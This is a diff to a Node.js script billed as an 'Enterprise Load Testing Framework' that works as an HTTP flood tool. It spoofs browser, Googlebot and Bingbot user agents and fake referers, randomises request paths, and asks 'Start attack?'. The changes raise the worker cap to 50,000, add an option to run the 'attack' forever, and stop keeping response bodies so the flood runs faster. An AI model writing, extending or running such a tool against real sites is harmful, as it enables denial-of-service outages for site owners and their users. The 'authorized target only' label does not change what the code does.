@@ -1,9 +1,8 @@
 #!/usr/bin/env node
 
 /**
- * TOBI v5.0 - Enterprise Load Testing Framework
+ * TOBI v5.0 - Enterprise Load Testing Framework (FIXED PROGRESS DISPLAY)
  * Authorized Target Only | No External Dependencies Required
- * Copy this entire file and save as Tobi.js
  */
 
 const crypto = require('crypto');
@@ -45,28 +44,22 @@ const userAgents = [
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
-    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
-    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0',
     'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
     'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0'
 ];
 
 // ==================== HEADERS ====================
 const acceptHeaders = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'application/json, text/plain, */*',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
 ];
 
 const acceptLanguages = [
-    'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9',
-    'es-ES,es;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9'
+    'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9',
 ];
 
 const referers = [
     'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/',
-    'https://github.com/', 'https://stackoverflow.com/', 'https://www.reddit.com/'
 ];
 
 // ==================== UTILITIES ====================
@@ -96,11 +89,9 @@ function generatePath() {
         `/${randomString(8)}`,
         `/api/v${randomInt(1,3)}/${randomString(8)}`,
         `/static/${randomHex(6)}`,
-        `/content/${randomInt(1000,99999)}`,
         `/search?q=${randomString(10)}`,
         `/page/${randomInt(1,1000)}`,
         `/user/${randomInt(10000,99999)}`,
-        `/product/${randomInt(1000,9999)}`
     ];
     
     let path = paths[Math.floor(Math.random() * paths.length)];
@@ -140,6 +131,7 @@ class Metrics {
         this.lastSecond = 0;
         this.lastSecondCount = 0;
         this.peakRps = 0;
+        this.lastDisplayTime = 0;
     }
 
     record(success, bytesCount = 0, responseTime = 0, statusCode = null, errorType = null) {
@@ -191,12 +183,16 @@ class Metrics {
     display() {
         const s = this.getStats();
         const mem = (process.memoryUsage().rss / 1024 / 1024).toFixed(0);
-        process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${s.rate.toFixed(1)}${c.reset} | ` +
+        
+        // Clear line and print new stats
+        console.log(`\r${c.cyan}RPS: ${c.bold}${s.rate.toFixed(1)}${c.reset} | ` +
             `${c.green}OK: ${s.success.toLocaleString()}${c.reset} | ` +
             `${c.red}FAIL: ${s.failed.toLocaleString()}${c.reset} | ` +
             `${c.yellow}${s.successRate.toFixed(1)}%${c.reset} | ` +
             `${c.magenta}${s.avgMs.toFixed(0)}ms${c.reset} | ` +
-            `${c.dim}MEM: ${mem}MB${c.reset}`);
+            `${c.blue}P95: ${s.p95Ms.toFixed(0)}ms${c.reset} | ` +
+            `${c.dim}MEM: ${mem}MB${c.reset} | ` +
+            `${c.green}REQS: ${s.total.toLocaleString()}${c.reset}`);
     }
 
     final() {
@@ -245,11 +241,9 @@ function makeRequest(url, options) {
         };
         
         const req = protocol.request(reqOptions, (res) => {
-            let body = [];
             let length = 0;
             
             res.on('data', (chunk) => {
-                body.push(chunk);
                 length += chunk.length;
                 if (length > 1024 * 100) {
                     req.destroy();
@@ -349,18 +343,18 @@ async function getConfig() {
     if (!target.startsWith('http')) target = 'https://' + target;
     target = target.replace(/\/$/, '');
     
-    let duration = await ask(`${c.bold}${c.cyan}⏱️  Duration (seconds) [default: 60]: ${c.reset}`);
+    let duration = await ask(`${c.bold}${c.cyan}⏱️  Duration (seconds) [0=forever, default: 60]: ${c.reset}`);
     duration = parseInt(duration) || 60;
     
-    let workers = await ask(`${c.bold}${c.cyan}👥 Concurrent workers [default: 1000, max: 10000]: ${c.reset}`);
-    workers = Math.min(parseInt(workers) || 1000, 10000);
+    let workers = await ask(`${c.bold}${c.cyan}👥 Concurrent workers [default: 1000, max: 50000]: ${c.reset}`);
+    workers = Math.min(parseInt(workers) || 1000, 50000);
     
     let rate = await ask(`${c.bold}${c.cyan}🚦 Rate limit per worker (0 = unlimited) [default: 0]: ${c.reset}`);
     rate = parseInt(rate) || 0;
     
     console.log(`\n${c.green}✓ Target: ${target}${c.reset}`);
     console.log(`${c.green}✓ Workers: ${workers.toLocaleString()}${c.reset}`);
-    console.log(`${c.green}✓ Duration: ${duration}s${c.reset}`);
+    console.log(`${c.green}✓ Duration: ${duration === 0 ? 'FOREVER' : duration + 's'}${c.reset}`);
     console.log(`${c.green}✓ Rate/Worker: ${rate === 0 ? 'UNLIMITED' : rate}${c.reset}\n`);
     
     let start = await ask(`${c.bold}${c.green}🚀 Start attack? (y/n): ${c.reset}`);
@@ -394,8 +388,9 @@ function showBanner(target, workers, duration) {
     
     console.log(`\n${c.cyan}🎯 Target: ${c.bold}${target}${c.reset}`);
     console.log(`${c.cyan}👥 Workers: ${c.bold}${workers.toLocaleString()}${c.reset}`);
-    console.log(`${c.cyan}⏱️  Duration: ${c.bold}${duration}s${c.reset}`);
-    console.log(`${c.cyan}⚡ Status: ${c.bold}${c.green}ATTACKING${c.reset}\n`);
+    console.log(`${c.cyan}⏱️  Duration: ${c.bold}${duration === 0 ? 'FOREVER' : duration + 's'}${c.reset}`);
+    console.log(`${c.cyan}⚡ Status: ${c.bold}${c.green}ATTACKING${c.reset}`);
+    console.log(`${c.dim}────────────────────────────────────────────────────────────────────────${c.reset}\n`);
 }
 
 // ==================== MAIN ====================
@@ -417,15 +412,35 @@ async function main() {
         stopFlag = true;
     });
     
+    console.log(`${c.yellow}🚀 Launching ${config.workers.toLocaleString()} workers...${c.reset}\n`);
+    
     for (let i = 0; i < config.workers; i++) {
         const worker = new Worker(i, metrics);
         workers.push(worker.run(config.target, () => stopFlag));
-        if (i % 500 === 0 && i > 0) await new Promise(r => setTimeout(r, 1));
+        if (i % 500 === 0 && i > 0) {
+            process.stdout.write(`\r${c.dim}Starting workers: ${i}/${config.workers}${c.reset}`);
+            await new Promise(r => setTimeout(r, 1));
+        }
     }
     
-    const interval = setInterval(() => metrics.display(), 500);
-    await new Promise(r => setTimeout(r, config.duration * 1000));
-    stopFlag = true;
+    console.log(`\r${c.green}✓ All ${config.workers.toLocaleString()} workers started!${c.reset}\n`);
+    
+    // Live stats display - updates every second
+    const interval = setInterval(() => {
+        if (!stopFlag) {
+            metrics.display();
+        }
+    }, 1000);
+    
+    // Run for duration (0 = forever)
+    if (config.duration > 0) {
+        await new Promise(r => setTimeout(r, config.duration * 1000));
+        stopFlag = true;
+    } else {
+        console.log(`${c.green}🔥 Attack running FOREVER - Press Ctrl+C to stop${c.reset}\n`);
+        // Wait indefinitely
+        await new Promise(r => {});
+    }
     
     clearInterval(interval);
     await new Promise(r => setTimeout(r, 2000));
